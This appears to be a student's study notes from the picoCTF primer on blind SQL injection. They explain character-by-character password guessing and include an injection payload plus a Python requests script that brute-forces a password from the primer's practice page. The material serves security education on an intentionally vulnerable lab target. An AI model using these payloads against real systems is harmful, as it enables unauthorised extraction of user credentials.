- this is when u can trick the application into returning stuff, but it doesn't actually show you the records

##### Solutions

- Guessing 1 character at a time :/
![image](https://primer.picoctf.org/images/3image14.png)
- if the application does tell u if it exists or not, you can guess a letter of the string at a time
- `' or username='picoctf' andÂ (select substr(password, 1, 1))='a`
	- targets the user picoctf and tries to find their password
	- the select substr is to check if the first letter is 'a'
	- this can be very slow manually, so we can use python requests to brute force it
- Brute force:
	- 'Printable' is just a string with all the printable ASCII characters, and we iterate over them.
	- 'Binary' in mysql context, is just a way to specify the we want to make case sensitive comparisons. If we do not use it, we would not be able to identify if a character is lowercase or uppercase.
```python
import requests
from string import printable

accum = ""
for i in range(40):
  for letter in printable:
    accum += letter

    r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
    + letter +"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")

    if 'NOTHING FOUND...' in r.text:
      accum = accum[:-1]
      print("nope")
    else:
      print(f"We found the character: {letter}")

print(accum)
```
